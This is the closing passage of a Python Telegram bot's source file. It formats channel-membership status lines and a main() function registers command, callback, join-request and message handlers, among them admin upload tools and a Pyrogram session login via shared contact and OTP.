        icon = {"member": "✅", "pending": "⏳", "missing": "❌"}.get(state, "⚠️")
        mode = ch.get("link_mode", "custom")
        pending_db = has_active_pending_request(ch["chat_id"], uid)
        lines.append(
            f"{icon} {esc(ch['name'])}: <b>{state}</b>\n"
            f"   mode=<code>{esc(mode)}</code> pending_record=<code>{str(pending_db).lower()}</code>"
        )

    await update.message.reply_text("\n".join(lines), parse_mode=ParseMode.HTML)


def main():
    mongo.admin.command("ping")

    app = (
        Application.builder()
        .token(BOT_TOKEN)
        .post_init(post_init)
        .post_stop(post_stop)
        .build()
    )

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("admin", admin))
    app.add_handler(CommandHandler("checkme", checkme))
    app.add_handler(CommandHandler("uploadstatus", admin_upload_status))
    app.add_handler(CommandHandler("setcustomlink", set_custom_link))
    app.add_handler(CommandHandler("session", pyro_session_start))
    app.add_handler(CommandHandler("cancel_session", pyro_cancel_command))
    app.add_handler(CommandHandler("resetverify", admin_reset_verify))

    app.add_handler(ChatJoinRequestHandler(on_join_request))
    app.add_handler(ChatMemberHandler(on_chat_member_update, ChatMemberHandler.CHAT_MEMBER))

    app.add_handler(CallbackQueryHandler(
        menu_callback,
        pattern=r"^(um_(videos|unlock|ref|progress)|am_(upload|batches|addgroup|groups|remove|stats)|up_(status|done|retry|publish|cancel)|flow_cancel)$"
    ))
    app.add_handler(CallbackQueryHandler(remove_chat_callback, pattern=r"^rm_(?:list|pick|yes|cancel)(?::.*)?$"))
    app.add_handler(CallbackQueryHandler(verify_join, pattern=r"^verify_join$"))
    app.add_handler(CallbackQueryHandler(noop_callback, pattern=r"^noop$"))
    app.add_handler(CallbackQueryHandler(pyro_otp_callback, pattern=r"^pyro_otp\|"))

    app.add_handler(MessageHandler(filters.CONTACT & filters.ChatType.PRIVATE, pyro_contact_handler))
    app.add_handler(MessageHandler(filters.VIDEO & filters.ChatType.PRIVATE, admin_collect_video))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND & filters.ChatType.PRIVATE, text_router))

    app.run_polling(
        drop_pending_updates=False,
        allowed_updates=Update.ALL_TYPES,
    )


if __name__ == "__main__":
    main()
